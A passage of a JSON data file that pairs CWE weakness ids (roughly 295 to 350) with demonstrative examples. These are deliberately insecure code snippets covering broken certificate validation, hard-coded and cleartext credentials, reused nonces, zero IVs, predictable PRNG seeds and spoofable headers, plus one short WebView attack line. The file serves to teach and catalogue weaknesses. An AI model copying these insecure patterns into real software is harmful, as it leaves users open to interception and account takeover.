        "id": 295,
        "demonstrative_examples": "Example 1 This code checks the certificate of a connected peer. (bad code) Example Language: C if ((cert = SSL_get_peer_certificate(ssl)) && host) foo=SSL_get_verify_result(ssl); if ((X509_V_OK==foo) || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN==foo)) // certificate looks good, host can be trusted In this case, because the certificate is self-signed, there was no external authority that could prove the identity of the host. The program could be communicating with a different system that is spoofing the host, e.g. by poisoning the DNS cache or using a MITM attack to modify the traffic from server to client. Example 2 The following OpenSSL code obtains a certificate and verifies it. (bad code) Example Language: C cert = SSL_get_peer_certificate(ssl); if (cert && (SSL_get_verify_result(ssl)==X509_V_OK)) { // do secret things } Even though the \"verify\" step returns X509_V_OK, this step does not include checking the Common Name against the name of the host. That is, there is no guarantee that the certificate is for the desired host. The SSL connection could have been established with a malicious host that provided a valid certificate. Example 3 The following OpenSSL code ensures that there is a certificate and allows the use of expired certificates. (bad code) Example Language: C if (cert = SSL_get_peer(certificate(ssl)) { foo=SSL_get_verify_result(ssl); if ((X509_V_OK==foo) || (X509_V_ERR_CERT_HAS_EXPIRED==foo)) //do stuff If the call to SSL_get_verify_result() returns X509_V_ERR_CERT_HAS_EXPIRED, this means that the certificate has expired. As time goes on, there is an increasing chance for attackers to compromise the certificate. Example 4 The following OpenSSL code ensures that there is a certificate before continuing execution. (bad code) Example Language: C if (cert = SSL_get_peer_certificate(ssl)) { // got a certificate, do secret things Because this code does not use SSL_get_verify_results() to check the certificate, it could accept certificates that have been revoked (X509_V_ERR_CERT_REVOKED). The software could be communicating with a malicious host. Example 5 The following OpenSSL code ensures that the host has a certificate. (bad code) Example Language: C if (cert = SSL_get_peer_certificate(ssl)) { // got certificate, host can be trusted //foo=SSL_get_verify_result(ssl); //if (X509_V_OK==foo) ... } Note that the code does not call SSL_get_verify_result(ssl), which effectively disables the validation step that checks the certificate."
    },
    {
        "id": 296,
        "demonstrative_examples": "Example 1 This code checks the certificate of a connected peer. (bad code) Example Language: C if ((cert = SSL_get_peer_certificate(ssl)) && host) foo=SSL_get_verify_result(ssl); if ((X509_V_OK==foo) || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN==foo)) // certificate looks good, host can be trusted In this case, because the certificate is self-signed, there was no external authority that could prove the identity of the host. The program could be communicating with a different system that is spoofing the host, e.g. by poisoning the DNS cache or using a MITM attack to modify the traffic from server to client."
    },
    {
        "id": 297,
        "demonstrative_examples": "Example 1 The following OpenSSL code obtains a certificate and verifies it. (bad code) Example Language: C cert = SSL_get_peer_certificate(ssl); if (cert && (SSL_get_verify_result(ssl)==X509_V_OK)) { // do secret things } Even though the \"verify\" step returns X509_V_OK, this step does not include checking the Common Name against the name of the host. That is, there is no guarantee that the certificate is for the desired host. The SSL connection could have been established with a malicious host that provided a valid certificate."
    },
    {
        "id": 298,
        "demonstrative_examples": "Example 1 The following OpenSSL code ensures that there is a certificate and allows the use of expired certificates. (bad code) Example Language: C if (cert = SSL_get_peer(certificate(ssl)) { foo=SSL_get_verify_result(ssl); if ((X509_V_OK==foo) || (X509_V_ERR_CERT_HAS_EXPIRED==foo)) //do stuff If the call to SSL_get_verify_result() returns X509_V_ERR_CERT_HAS_EXPIRED, this means that the certificate has expired. As time goes on, there is an increasing chance for attackers to compromise the certificate."
    },
    {
        "id": 299,
        "demonstrative_examples": "Example 1 The following OpenSSL code ensures that there is a certificate before continuing execution. (bad code) Example Language: C if (cert = SSL_get_peer_certificate(ssl)) { // got a certificate, do secret things Because this code does not use SSL_get_verify_results() to check the certificate, it could accept certificates that have been revoked (X509_V_ERR_CERT_REVOKED). The software could be communicating with a malicious host."
    },
    {
        "id": 300,
        "demonstrative_examples": "Example 1 In the Java snippet below, data is sent over an unencrypted channel to a remote server. (bad code) Example Language: Java Socket sock; PrintWriter out; try { sock = new Socket(REMOTE_HOST, REMOTE_PORT); out = new PrintWriter(echoSocket.getOutputStream(), true); // Write data to remote host via socket output stream. ... } By eavesdropping on the communication channel or posing as the endpoint, an attacker would be able to read all of the transmitted data."
    },
    {
        "id": 301,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C unsigned char *simple_digest(char *alg,char *buf,unsigned int len, int *olen) { const EVP_MD *m; EVP_MD_CTX ctx; unsigned char *ret; OpenSSL_add_all_digests(); if (!(m = EVP_get_digestbyname(alg))) return NULL; if (!(ret = (unsigned char*)malloc(EVP_MAX_MD_SIZE))) return NULL; EVP_DigestInit(&ctx, m); EVP_DigestUpdate(&ctx,buf,len); EVP_DigestFinal(&ctx,ret,olen); return ret; } unsigned char *generate_password_and_cmd(char *password_and_cmd) { simple_digest(\"sha1\",password,strlen(password_and_cmd) ... ); } (bad code) Example Language: Java String command = new String(\"some cmd to execute & the password\") MessageDigest encer = MessageDigest.getInstance(\"SHA\"); encer.update(command.getBytes(\"UTF-8\")); byte[] digest = encer.digest();"
    },
    {
        "id": 302,
        "demonstrative_examples": "Example 1 In the following example, an \"authenticated\" cookie is used to determine whether or not a user should be granted access to a system. (bad code) Example Language: Java boolean authenticated = new Boolean(getCookieValue(\"authenticated\")).booleanValue(); if (authenticated) { ... } Modifying the value of a cookie on the client-side is trivial, but many developers assume that cookies are essentially immutable."
    },
    {
        "id": 303,
        "demonstrative_examples": ""
    },
    {
        "id": 304,
        "demonstrative_examples": ""
    },
    {
        "id": 305,
        "demonstrative_examples": ""
    },
    {
        "id": 306,
        "demonstrative_examples": "Example 1 In the following Java example the method createBankAccount is used to create a BankAccount object for a bank management application. (bad code) Example Language: Java public BankAccount createBankAccount(String accountNumber, String accountType, String accountName, String accountSSN, double balance) { BankAccount account = new BankAccount(); account.setAccountNumber(accountNumber); account.setAccountType(accountType); account.setAccountOwnerName(accountName); account.setAccountOwnerSSN(accountSSN); account.setBalance(balance); return account; } However, there is no authentication mechanism to ensure that the user creating this bank account object has the authority to create new bank accounts. Some authentication mechanisms should be used to verify that the user has the authority to create bank account objects. The following Java code includes a boolean variable and method for authenticating a user. If the user has not been authenticated then the createBankAccount will not create the bank account object. (good code) Example Language: Java private boolean isUserAuthentic = false; // authenticate user, // if user is authenticated then set variable to true // otherwise set variable to false public boolean authenticateUser(String username, String password) { ... } public BankAccount createNewBankAccount(String accountNumber, String accountType, String accountName, String accountSSN, double balance) { BankAccount account = null; if (isUserAuthentic) { account = new BankAccount(); account.setAccountNumber(accountNumber); account.setAccountType(accountType); account.setAccountOwnerName(accountName); account.setAccountOwnerSSN(accountSSN); account.setBalance(balance); } return account; }"
    },
    {
        "id": 307,
        "demonstrative_examples": "Example 1 \"In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.\" Example 1 References: [REF-236] Kim Zetter. \"Weak Password Brings \\'Happiness\\' to Twitter Hacker\". 2009-01-09. \\n\\t\\t\\t\\t< http://www.wired.com/threatlevel/2009/01/professed-twitt/ >. Example 2 \"The following code, extracted from a servlet's doPost() method, performs an authentication lookup every time the servlet is invoked.\" (bad code) Example Language: Java String username = request.getParameter(\"username\"); String password = request.getParameter(\"password\"); int authResult = authenticateUser(username, password); However, the software makes no attempt to restrict excessive authentication attempts. Example 3 This code attempts to limit the number of login attempts by causing the process to sleep before completing the authentication. (bad code) Example Language: PHP \"$username = $_POST['username'];\" \"$password = $_POST['password'];\" sleep(2000); $isAuthenticated = authenticateUser($username, $password); However, there is no limit on parallel connections, so this does not increase the amount of time an attacker needs to complete an attack. Example 4 In the following C/C++ example the validateUser method opens a socket connection, reads a username and password from the socket and attempts to authenticate the username and password. (bad code) Example Language: C int validateUser(char *host, int port) { int socket = openSocketConnection(host, port); if (socket < 0) { printf(\"Unable to open socket connection\"); return(FAIL); } int isValidUser = 0; char username[USERNAME_SIZE]; char password[PASSWORD_SIZE]; while (isValidUser == 0) { if (getNextMessage(socket, username, USERNAME_SIZE) > 0) { if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) { isValidUser = AuthenticateUser(username, password); } } } return(SUCCESS); } The validateUser method will continuously check for a valid username and password without any restriction on the number of authentication attempts made. The method should limit the number of authentication attempts made to prevent brute force attacks as in the following example code. (good code) Example Language: C int validateUser(char *host, int port) { ... int count = 0; while ((isValidUser == 0) && (count < MAX_ATTEMPTS)) { if (getNextMessage(socket, username, USERNAME_SIZE) > 0) { if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) { isValidUser = AuthenticateUser(username, password); } } count++; } if (isValidUser) { return(SUCCESS); } else { return(FAIL); } }"
    },
    {
        "id": 308,
        "demonstrative_examples": "Example 1 In both of these examples, a user is logged in if their given password matches a stored password: (bad code) Example Language: C unsigned char *check_passwd(char *plaintext) { ctext = simple_digest(\"sha1\",plaintext,strlen(plaintext), ... ); //Login if hash matches stored hash if (equal(ctext, secret_password())) { login_user(); } } (bad code) Example Language: Java String plainText = new String(plainTextIn); MessageDigest encer = MessageDigest.getInstance(\"SHA\"); encer.update(plainTextIn); byte[] digest = password.digest(); //Login if hash matches stored hash if (equal(digest,secret_password())) { login_user(); } This code relies exclusively on a password mechanism ( CWE-309 ) using only one factor of authentication ( CWE-308 \"). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (\" CWE-328 ). It also does not use a salt ( CWE-759 )."
    },
    {
        "id": 309,
        "demonstrative_examples": "Example 1 In both of these examples, a user is logged in if their given password matches a stored password: (bad code) Example Language: C unsigned char *check_passwd(char *plaintext) { ctext = simple_digest(\"sha1\",plaintext,strlen(plaintext), ... ); //Login if hash matches stored hash if (equal(ctext, secret_password())) { login_user(); } } (bad code) Example Language: Java String plainText = new String(plainTextIn); MessageDigest encer = MessageDigest.getInstance(\"SHA\"); encer.update(plainTextIn); byte[] digest = password.digest(); //Login if hash matches stored hash if (equal(digest,secret_password())) { login_user(); } This code relies exclusively on a password mechanism ( CWE-309 ) using only one factor of authentication ( CWE-308 \"). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (\" CWE-328 ). It also does not use a salt ( CWE-759 )."
    },
    {
        "id": 311,
        "demonstrative_examples": "Example 1 \"This code writes a user's login information to a cookie so the user does not have to login again later.\" (bad code) Example Language: PHP function persistLogin($username, $password){ $data = array(\"username\" => $username, \"password\"=> $password); setcookie (\"userdata\", $data); } \"The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (\" CWE-79 ) could allow an attacker to remotely copy the cookie. Also note this example code also exhibits Plaintext Storage in a Cookie ( CWE-315 ). Example 2 The following code attempts to establish a connection, read in a password, then store it to a buffer. (bad code) Example Language: C server.sin_family = AF_INET; hp = gethostbyname(argv[1]); if (hp==NULL) error(\"Unknown host\"); memcpy( (char *)&server.sin_addr,(char *)hp->h_addr,hp->h_length); if (argc < 3) port = 80; else port = (unsigned short)atoi(argv[3]); server.sin_port = htons(port); if (connect(sock, (struct sockaddr *)&server, sizeof server) < 0) error(\"Connecting\"); ... while ((n=read(sock,buffer,BUFSIZE-1))!=-1) { write(dfd,password_buffer,n); ... While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors. Example 3 The following code attempts to establish a connection to a site to communicate sensitive information. (bad code) Example Language: Java try { URL u = new URL(\"http://www.secret.example.org/\"); HttpURLConnection hu = (HttpURLConnection) u.openConnection(); hu.setRequestMethod(\"PUT\"); hu.connect(); OutputStream os = hu.getOutputStream(); hu.disconnect(); } catch (IOException e) { //... } Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors."
    },
    {
        "id": 312,
        "demonstrative_examples": "Example 1 The following code excerpt stores a plaintext user account ID in a browser cookie. (bad code) Example Language: Java response.addCookie( new Cookie(\"userAccountID\", acctID); \"Because the account ID is in plaintext, the user's account information is exposed if their computer is compromised by an attacker.\" Example 2 \"This code writes a user's login information to a cookie so the user does not have to login again later.\" (bad code) Example Language: PHP function persistLogin($username, $password){ $data = array(\"username\" => $username, \"password\"=> $password); setcookie (\"userdata\", $data); } \"The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (\" CWE-79 ) could allow an attacker to remotely copy the cookie. Also note this example code also exhibits Plaintext Storage in a Cookie ( CWE-315 ). Example 3 The following code attempts to establish a connection, read in a password, then store it to a buffer. (bad code) Example Language: C server.sin_family = AF_INET; hp = gethostbyname(argv[1]); if (hp==NULL) error(\"Unknown host\"); memcpy( (char *)&server.sin_addr,(char *)hp->h_addr,hp->h_length); if (argc < 3) port = 80; else port = (unsigned short)atoi(argv[3]); server.sin_port = htons(port); if (connect(sock, (struct sockaddr *)&server, sizeof server) < 0) error(\"Connecting\"); ... while ((n=read(sock,buffer,BUFSIZE-1))!=-1) { write(dfd,password_buffer,n); ... While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors. Example 4 The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext. This Java example shows a properties file with a cleartext username / password pair. (bad code) Example Language: Java # Java Web App ResourceBundle properties file ... webapp.ldap.username=secretUsername webapp.ldap.password=secretPassword ... The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext. (bad code) Example Language: ASP.NET ... <connectionStrings> <add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" /> </connectionStrings> ... Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."
    },
    {
        "id": 313,
        "demonstrative_examples": "Example 1 The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext. This Java example shows a properties file with a cleartext username / password pair. (bad code) Example Language: Java # Java Web App ResourceBundle properties file ... webapp.ldap.username=secretUsername webapp.ldap.password=secretPassword ... The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext. (bad code) Example Language: ASP.NET ... <connectionStrings> <add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" /> </connectionStrings> ... Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information."
    },
    {
        "id": 314,
        "demonstrative_examples": ""
    },
    {
        "id": 315,
        "demonstrative_examples": "Example 1 The following code excerpt stores a plaintext user account ID in a browser cookie. (bad code) Example Language: Java response.addCookie( new Cookie(\"userAccountID\", acctID); \"Because the account ID is in plaintext, the user's account information is exposed if their computer is compromised by an attacker.\""
    },
    {
        "id": 316,
        "demonstrative_examples": ""
    },
    {
        "id": 317,
        "demonstrative_examples": ""
    },
    {
        "id": 318,
        "demonstrative_examples": ""
    },
    {
        "id": 319,
        "demonstrative_examples": "Example 1 The following code attempts to establish a connection to a site to communicate sensitive information. (bad code) Example Language: Java try { URL u = new URL(\"http://www.secret.example.org/\"); HttpURLConnection hu = (HttpURLConnection) u.openConnection(); hu.setRequestMethod(\"PUT\"); hu.connect(); OutputStream os = hu.getOutputStream(); hu.disconnect(); } catch (IOException e) { //... } Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors."
    },
    {
        "id": 321,
        "demonstrative_examples": "Example 1 The following code examples attempt to verify a password using a hard-coded cryptographic key. (bad code) Example Language: C int VerifyAdmin(char *password) { if (strcmp(password,\"68af404b513073584c4b6f22b6c63e6b\")) { printf(\"Incorrect Password!\\\\n\"); return(0); } printf(\"Entering Diagnostic Mode...\\\\n\"); return(1); } (bad code) Example Language: Java public boolean VerifyAdmin(String password) { if (password.equals(\"68af404b513073584c4b6f22b6c63e6b\")) { System.out.println(\"Entering Diagnostic Mode...\"); return true; } System.out.println(\"Incorrect Password!\"); return false; (bad code) Example Language: C# int VerifyAdmin(String password) { if (password.Equals(\"68af404b513073584c4b6f22b6c63e6b\")) { Console.WriteLine(\"Entering Diagnostic Mode...\"); return(1); } Console.WriteLine(\"Incorrect Password!\"); return(0); } The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system."
    },
    {
        "id": 322,
        "demonstrative_examples": "Example 1 Many systems have used Diffie-Hellman key exchange without authenticating the entities exchanging keys, allowing attackers to influence communications by redirecting or interfering with the communication path.  Many people using SSL/TLS skip the authentication (often unknowingly)."
    },
    {
        "id": 323,
        "demonstrative_examples": "Example 1 This code takes a password, concatenates it with a nonce, then encrypts it before sending over a network: (bad code) Example Language: C void encryptAndSendPassword(char *password){ char *nonce = \"bad\"; ... char *data = (unsigned char*)malloc(20); int para_size = strlen(nonce) + strlen(password); char *paragraph = (char*)malloc(para_size); SHA1((const unsigned char*)paragraph,parsize,(unsigned char*)data); sendEncryptedData(data) } Because the nonce used is always the same, an attacker can impersonate a trusted party by intercepting and resending the encrypted password. This attack avoids the need to learn the unencrypted password. Example 2 This code sends a command to a remote server, using an encrypted password and nonce to prove the command is from a trusted party: (bad code) Example Language: C++ String command = new String(\"some command to execute\"); MessageDigest nonce = MessageDigest.getInstance(\"SHA\"); nonce.update(String.valueOf(\"bad nonce\")); byte[] nonce = nonce.digest(); MessageDigest password = MessageDigest.getInstance(\"SHA\"); password.update(nonce + \"secretPassword\"); byte[] digest = password.digest(); sendCommand(digest, command) Once again the nonce used is always the same. An attacker may be able to replay previous legitimate commands or execute new arbitrary commands."
    },
    {
        "id": 324,
        "demonstrative_examples": "Example 1 The following code attempts to verify that a certificate is valid. (bad code) Example Language: C if (cert = SSL_get_peer_certificate(ssl)) { foo=SSL_get_verify_result(ssl); if ((X509_V_OK==foo) || (X509_V_ERRCERT_NOT_YET_VALID==foo)) //do stuff } The code checks if the certificate is not yet valid, but it fails to check if a certificate is past its expiration date, thus treating expired certificates as valid."
    },
    {
        "id": 325,
        "demonstrative_examples": ""
    },
    {
        "id": 326,
        "demonstrative_examples": ""
    },
    {
        "id": 327,
        "demonstrative_examples": "Example 1 These code examples use the Data Encryption Standard (DES). (bad code) Example Language: C EVP_des_ecb(); (bad code) Example Language: Java Cipher des=Cipher.getInstance(\"DES...\"); des.initEncrypt(key2); (bad code) Example Language: PHP function encryptPassword($password){ $iv_size = mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_ECB); $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND); $key = \"This is a password encryption key\"; $encryptedPassword = mcrypt_encrypt(MCRYPT_DES, $key, $password, MCRYPT_MODE_ECB, $iv); return $encryptedPassword; } Once considered a strong algorithm, DES now regarded as insufficient for many applications. It has been replaced by Advanced Encryption Standard (AES)."
    },
    {
        "id": 328,
        "demonstrative_examples": "Example 1 In both of these examples, a user is logged in if their given password matches a stored password: (bad code) Example Language: C unsigned char *check_passwd(char *plaintext) { ctext = simple_digest(\"sha1\",plaintext,strlen(plaintext), ... ); //Login if hash matches stored hash if (equal(ctext, secret_password())) { login_user(); } } (bad code) Example Language: Java String plainText = new String(plainTextIn); MessageDigest encer = MessageDigest.getInstance(\"SHA\"); encer.update(plainTextIn); byte[] digest = password.digest(); //Login if hash matches stored hash if (equal(digest,secret_password())) { login_user(); } This code relies exclusively on a password mechanism ( CWE-309 ) using only one factor of authentication ( CWE-308 \"). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (\" CWE-328 ). It also does not use a salt ( CWE-759 )."
    },
    {
        "id": 329,
        "demonstrative_examples": "Example 1 In the following examples, CBC mode is used when encrypting data: (bad code) Example Language: C EVP_CIPHER_CTX ctx; char key[EVP_MAX_KEY_LENGTH]; char iv[EVP_MAX_IV_LENGTH]; RAND_bytes(key, b); memset(iv,0,EVP_MAX_IV_LENGTH); EVP_EncryptInit(&ctx,EVP_bf_cbc(), key,iv); (bad code) Example Language: Java public class SymmetricCipherTest { public static void main() { byte[] text =\"Secret\".getBytes(); byte[] iv ={ 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 }; KeyGenerator kg = KeyGenerator.getInstance(\"DES\"); kg.init(56); SecretKey key = kg.generateKey(); Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\"); IvParameterSpec ips = new IvParameterSpec(iv); cipher.init(Cipher.ENCRYPT_MODE, key, ips); return cipher.doFinal(inpBytes); } } In both of these examples, the initialization vector (IV) is always a block of zeros. This makes the resulting cipher text much more predictable and susceptible to a dictionary attack."
    },
    {
        "id": 330,
        "demonstrative_examples": "Example 1 \"This code generates a unique random identifier for a user's session.\" (bad code) Example Language: PHP function generateSessionID($userID){ srand($userID); return rand(); } \"Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.\" This example also exhibits a Small Seed Space ( CWE-339 ). Example 2 The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. (bad code) Example Language: Java String GenerateReceiptURL(String baseUrl) { Random ranGen = new Random(); ranGen.setSeed((new Date()).getTime()); return(baseUrl + ranGen.nextInt(400000000) + \".html\"); } This code uses the Random.nextInt() function to generate \"unique\" identifiers for the receipt pages it generates. Because Random.nextInt() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG."
    },
    {
        "id": 331,
        "demonstrative_examples": "Example 1 \"This code generates a unique random identifier for a user's session.\" (bad code) Example Language: PHP function generateSessionID($userID){ srand($userID); return rand(); } \"Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.\" This example also exhibits a Small Seed Space ( CWE-339 ). Example 2 The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase. (bad code) Example Language: Java String GenerateReceiptURL(String baseUrl) { Random ranGen = new Random(); ranGen.setSeed((new Date()).getTime()); return(baseUrl + ranGen.nextInt(400000000) + \".html\"); } This code uses the Random.nextInt() function to generate \"unique\" identifiers for the receipt pages it generates. Because Random.nextInt() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG."
    },
    {
        "id": 332,
        "demonstrative_examples": ""
    },
    {
        "id": 333,
        "demonstrative_examples": "Example 1 This code uses a TRNG to generate a unique session id for new connections to a server: (bad code) Example Language: C while (1){ if (haveNewConnection()){ if (hwRandom()){ int sessionID = hwRandom(); createNewConnection(sessionID); } } } This code does not attempt to limit the number of new connections or make sure the TRNG can successfully generate a new random number. An attacker may be able to create many new connections and exhaust the entropy of the TRNG. The TRNG may then block and cause the program to crash or hang."
    },
    {
        "id": 334,
        "demonstrative_examples": "Example 1 The following XML example code is a deployment descriptor for a Java web application deployed on a Sun Java Application Server. This deployment descriptor includes a session configuration property for configuring the session ID length. (bad code) Example Language: XML <sun-web-app> ... <session-config> <session-properties> <property name=\"idLengthBytes\" value=\"8\"> \"<description>The number of bytes in this web module's session ID.</description>\" </property> </session-properties> </session-config> ... </sun-web-app> \"This deployment descriptor has set the session ID length for this Java web application to 8 bytes (or 64 bits). The session ID length for Java web applications should be set to 16 bytes (128 bits) to prevent attackers from guessing and/or stealing a session ID and taking over a user's session.\" Note for most application servers including the Sun Java Application Server the session ID length is by default set to 128 bits and should not be changed. And for many application servers the session ID length cannot be changed from this default setting. Check your application server documentation for the session ID length default setting and configuration options to ensure that the session ID length is set to 128 bits."
    },
    {
        "id": 335,
        "demonstrative_examples": ""
    },
    {
        "id": 336,
        "demonstrative_examples": "Example 1 The following code uses a statistical PRNG to generate account IDs. (bad code) Example Language: Java private static final long SEED = 1234567890; public int generateAccountID() { Random random = new Random(SEED); return random.nextInt(); } Because the program uses the same seed value for every invocation of the PRNG, its values are predictable, making the system vulnerable to attack."
    },
    {
        "id": 337,
        "demonstrative_examples": "Example 1 Both of these examples use a statistical PRNG seeded with the current value of the system clock to generate a random number: (bad code) Example Language: Java Random random = new Random(System.currentTimeMillis()); int accountID = random.nextInt(); (bad code) Example Language: C srand(time()); int randNum = rand(); An attacker can easily predict the seed used by these PRNGs, and so also predict the stream of random numbers generated. Note these examples also exhibit CWE-338 (Use of Cryptographically Weak PRNG)."
    },
    {
        "id": 338,
        "demonstrative_examples": "Example 1 Both of these examples use a statistical PRNG seeded with the current value of the system clock to generate a random number: (bad code) Example Language: Java Random random = new Random(System.currentTimeMillis()); int accountID = random.nextInt(); (bad code) Example Language: C srand(time()); int randNum = rand(); The random number functions used in these examples, rand() and Random.nextInt(), are not considered cryptographically strong. An attacker may be able to predict the random numbers generated by these functions. Note that these example also exhibit CWE-337 (Predictable Seed in PRNG)."
    },
    {
        "id": 339,
        "demonstrative_examples": ""
    },
    {
        "id": 340,
        "demonstrative_examples": ""
    },
    {
        "id": 341,
        "demonstrative_examples": "Example 1 \"This code generates a unique random identifier for a user's session.\" (bad code) Example Language: PHP function generateSessionID($userID){ srand($userID); return rand(); } \"Because the seed for the PRNG is always the user's ID, the session ID will always be the same. An attacker could thus predict any user's session ID and potentially hijack the session.\" This example also exhibits a Small Seed Space ( CWE-339 )."
    },
    {
        "id": 342,
        "demonstrative_examples": ""
    },
    {
        "id": 343,
        "demonstrative_examples": ""
    },
    {
        "id": 344,
        "demonstrative_examples": ""
    },
    {
        "id": 345,
        "demonstrative_examples": ""
    },
    {
        "id": 346,
        "demonstrative_examples": "Example 1 This Android application will remove a user account when it receives an intent to do so: (bad code) Example Language: Java IntentFilter filter = new IntentFilter(\"com.example.RemoveUser\"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); public class DeleteReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { int userID = intent.getIntExtra(\"userID\"); destroyUserData(userID); } } This application does not check the origin of the intent, thus allowing any malicious application to remove a user. Always check the origin of an intent, or create an allowlist of trusted applications using the manifest.xml file. Example 2 These Android and iOS applications intercept URL loading within a WebView and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application: (bad code) Example Language: Java // Android @Override public boolean shouldOverrideUrlLoading(WebView view, String url){ if (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){ if(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){ writeDataToView(view, UserData); return false; } else{ return true; } } } (bad code) Example Language: Objective-C // iOS -(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType { NSURL *URL = [exRequest URL]; if ([[URL scheme] isEqualToString:@\"exampleScheme\"]) { NSString *functionString = [URL resourceSpecifier]; if ([functionString hasPrefix:@\"specialFunction\"]) { // Make data available back in webview. UIWebView *webView = [self writeDataToView:[URL query]]; } return NO; } return YES; } A call into native code can then be initiated by passing parameters within the URL: (attack code) Example Language: JavaScript window.location = examplescheme://method?parameter=value Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site."
    },
    {
        "id": 347,
        "demonstrative_examples": "Example 1 In the following code, a JarFile object is created from a downloaded file. (bad code) Example Language: Java File f = new File(downloadedFilePath); JarFile jf = new JarFile(f); The JAR file that was potentially downloaded from an untrusted source is created without verifying the signature (if present). An alternate constructor that accepts a boolean verify parameter should be used instead."
    },
    {
        "id": 348,
        "demonstrative_examples": "Example 1 \"This code attempts to limit the access of a page to certain IP Addresses. It checks the 'HTTP_X_FORWARDED_FOR' header in case an authorized user is sending the request through a proxy.\" (bad code) Example Language: PHP \"$requestingIP = '0.0.0.0';\" \"if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {\" \"$requestingIP = $_SERVER['HTTP_X_FORWARDED_FOR'];\" else{ \"$requestingIP = $_SERVER['REMOTE_ADDR'];\" } if(in_array($requestingIP,$ipAllowlist)){ generatePage(); return; } else{ echo \"You are not authorized to view this page\"; return; } \"The 'HTTP_X_FORWARDED_FOR' header can be user controlled and so should never be trusted. An attacker can falsify the header to gain access to the page.\" \"This fixed code only trusts the 'REMOTE_ADDR' header and so avoids the issue:\" (good code) Example Language: PHP \"$requestingIP = '0.0.0.0';\" \"if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {\" echo \"This application cannot be accessed through a proxy.\"; return; else{ \"$requestingIP = $_SERVER['REMOTE_ADDR'];\" } ... \"Be aware that 'REMOTE_ADDR' can still be spoofed. This may seem useless because the server will send the response to the fake address and not the attacker, but this may still be enough to conduct an attack. For example, if the generatePage() function in this code is resource intensive, an attacker could flood the server with fake requests using an authorized IP and consume significant resources. This could be a serious DoS attack even though the attacker would never see the page's sensitive content.\""
    },
    {
        "id": 349,
        "demonstrative_examples": ""
    },
    {
        "id": 350,
